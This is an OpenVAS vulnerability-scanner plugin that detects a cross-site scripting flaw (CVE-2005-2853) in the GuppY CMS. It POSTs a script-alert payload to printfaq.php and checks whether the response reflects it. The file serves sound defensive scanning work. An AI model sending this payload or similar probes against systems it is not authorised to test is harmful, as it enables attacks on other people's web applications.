# OpenVAS Vulnerability Test
# $Id: guppy_directory_traversal.nasl 17 2013-10-27 14:01:43Z jan $
# Description: GuppY pg Parameter Vulnerability
#
# Authors:
# Josh Zlatin-Amishav (josh at ramat dot cc)
#
# Copyright:
# Copyright (C) 2005 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote web server contains a PHP script that is prone to cross-site
scripting and possibly directory traversal attacks.

Description :

The remote host is running GuppY / EasyGuppY, a CMS written in PHP. 

The version of Guppy / EasyGuppY installed on the remote host fails to
sanitize user-supplied input to the 'pg' field in the 'printfaq.php'
script.  An attacker can exploit this flaw to launch cross-site
scripting and possibly directory traversal attacks against the affected
application.";

tag_solution = "Upgrade to version 4.5.6a or later.";

if (description) {
  script_id(19942);
  script_version("$Revision: 17 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_cve_id("CVE-2005-2853");
  script_bugtraq_id(14752, 14984);
 script_tag(name:"cvss_base", value:"4.3");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_tag(name:"risk_factor", value:"Medium");

  name = "GuppY pg Parameter Vulnerability";
  script_name(name);
 
  desc = "
  Summary:
  " + tag_summary + "
  Solution:
  " + tag_solution;
  script_description(desc);
 
  summary = "Checks for pg parameter flaw in Guppy";
  script_summary(summary);
 
  script_category(ACT_ATTACK);
  script_family("Web application abuses");

  script_copyright("(C) 2005 Josh Zlatin-Amishav");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/bugtraq/2005-09/0362.html");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);

# A simple alert.
xss = "<script>alert('" + SCRIPT_NAME + "');</script>";
# nb: the url-encoded version is what we need to pass in.
exss = urlencode(str:xss);

foreach dir ( cgi_dirs() )
{
  # Make sure the affected script exists.
  req = http_get(item:string(dir, "/printfaq.php?lng=en&pg=1"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does and looks like GuppY...
  if ("<title>GuppY - " >< res) {
    # Try to exploit the flaw.
    #
    # nb: we'll use a POST since 4.5.5 prevents GETs from working but
    #     still allows us to pass data via POSTs and cookies. Also, we
    #     check for the XSS rather than try to read an arbitrary file
    #     since the latter doesn't work with 4.5.5 except under Windows.
    postdata = string(
      'pg=', exss
    );
    req = string(
      "POST /", dir, "/printfaq.php HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);
    
    if ( xss >< res )
    {
        security_warning(port);
        exit(0);
    }
  }
}
